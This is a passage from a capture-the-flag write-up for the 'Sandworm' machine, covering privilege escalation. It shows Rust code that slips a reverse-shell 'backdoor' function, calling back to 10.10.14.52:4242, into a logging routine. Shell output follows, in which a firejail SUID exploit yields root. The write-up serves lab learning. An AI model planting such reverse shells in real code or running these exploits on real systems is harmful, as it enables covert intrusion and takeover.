+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">io</span><span class="p">::</span><span class="n">Write</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">chrono</span><span class="p">::</span><span class="n">prelude</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
+
+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">net</span><span class="p">::</span><span class="n">TcpStream</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">os</span><span class="p">::</span><span class="n">unix</span><span class="p">::</span><span class="n">io</span><span class="p">::{</span><span class="n">AsRawFd</span><span class="p">,</span><span class="w"> </span><span class="n">FromRawFd</span><span class="p">};</span>
+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">process</span><span class="p">::{</span><span class="n">Command</span><span class="p">,</span><span class="w"> </span><span class="n">Stdio</span><span class="p">};</span>
+
+
+<span class="k">fn</span><span class="w"> </span><span class="nf">backdoor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TcpStream</span><span class="p">::</span><span class="n">connect</span><span class="p">(</span><span class="s">&quot;10.10.14.52:4242&quot;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="p">.</span><span class="n">as_raw_fd</span><span class="p">();</span>
+
+<span class="w">    </span><span class="n">Command</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">&quot;-i&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="n">stdin</span><span class="p">(</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Stdio</span><span class="p">::</span><span class="n">from_raw_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="w"> </span><span class="p">})</span>
+<span class="w">        </span><span class="p">.</span><span class="n">stdout</span><span class="p">(</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Stdio</span><span class="p">::</span><span class="n">from_raw_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="w"> </span><span class="p">})</span>
+<span class="w">        </span><span class="p">.</span><span class="n">stderr</span><span class="p">(</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Stdio</span><span class="p">::</span><span class="n">from_raw_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="w"> </span><span class="p">})</span>
+<span class="w">        </span><span class="p">.</span><span class="n">spawn</span><span class="p">()</span>
+<span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">()</span>
+<span class="w">        </span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+<span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">pub</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">log</span><span class="p">(</span><span class="n">user</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">,</span><span class="w"> </span><span class="n">query</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">,</span><span class="w"> </span><span class="n">justification</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Local</span><span class="p">::</span><span class="n">now</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">now</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="s">&quot;%Y-%m-%d %H:%M:%S&quot;</span><span class="p">).</span><span class="n">to_string</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">log_message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;[{}] - User: {}, Query: {}, Justification: {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">timestamp</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">query</span><span class="p">,</span><span class="w"> </span><span class="n">justification</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">match</span><span class="w"> </span><span class="n">OpenOptions</span><span class="p">::</span><span class="n">new</span><span class="p">().</span><span class="n">append</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="n">create</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/opt/tipnet/access.log&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">file</span><span class="p">,</span>
+<span class="w">        </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Error opening log file: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span>
+<span class="w">            </span><span class="k">return</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">};</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file</span><span class="p">.</span><span class="n">write_all</span><span class="p">(</span><span class="n">log_message</span><span class="p">.</span><span class="n">as_bytes</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Error writing to log file: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">backdoor</span><span class="p">()</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>And we get a callback as atlas, but outside the jail that the web-app was in.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>atlas@sandworm:/opt/tipnet$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/usr/bin<span class="p">|</span>wc<span class="w"> </span>-l
+ls<span class="w"> </span>-la<span class="w"> </span>/usr/bin<span class="p">|</span>wc<span class="w"> </span>-l
+<span class="m">1214</span>
+</pre></div>
+</div>
+<p>We saw earlier that firejail has the SUID flag, and atlas has access to it through the jailer group</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>atlas@sandworm:/opt/tipnet$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/usr/local/bin/firejail
+ls<span class="w"> </span>-la<span class="w"> </span>/usr/local/bin/firejail
+-rwsr-x---<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>jailer<span class="w"> </span><span class="m">1777952</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">29</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/usr/local/bin/firejail
+atlas@sandworm:/opt/tipnet$<span class="w"> </span>id
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>atlas<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>atlas<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>atlas<span class="o">)</span>,1002<span class="o">(</span>jailer<span class="o">)</span>
+</pre></div>
+</div>
+<p>And there is a SUID exploit for firejail: <a class="reference external" href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">Gist</a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>atlas@sandworm:/dev/shm$<span class="w"> </span>python3<span class="w"> </span>exploit.py
+You<span class="w"> </span>can<span class="w"> </span>now<span class="w"> </span>run<span class="w"> </span><span class="s1">&#39;firejail --join=2741&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span>another<span class="w"> </span>terminal<span class="w"> </span>to<span class="w"> </span>obtain<span class="w"> </span>a<span class="w"> </span>shell<span class="w"> </span>where<span class="w"> </span><span class="s1">&#39;sudo su -&#39;</span><span class="w"> </span>should<span class="w"> </span>grant<span class="w"> </span>you<span class="w"> </span>a<span class="w"> </span>root<span class="w"> </span>shell.
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>atlas@sandworm:~$<span class="w"> </span>firejail<span class="w"> </span>--join<span class="o">=</span><span class="m">2741</span>
+changing<span class="w"> </span>root<span class="w"> </span>to<span class="w"> </span>/proc/2741/root
+Warning:<span class="w"> </span>cleaning<span class="w"> </span>all<span class="w"> </span>supplementary<span class="w"> </span>groups
+Child<span class="w"> </span>process<span class="w"> </span>initialized<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">22</span>.15<span class="w"> </span>ms
+atlas@sandworm:~$<span class="w"> </span>su<span class="w"> </span>-
+root@sandworm:~#
+root@sandworm:~#
+root@sandworm:~#
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../scrambled/scrambled.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Scrambled</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../outdated/outdated.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Outdated</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Sandworm</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#getting-familiar-with-gnupg">Getting familiar with GnuPG</a></li>
+<li><a class="reference internal" href="#ssti">SSTI</a></li>
+<li><a class="reference internal" href="#privesc">Privesc</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
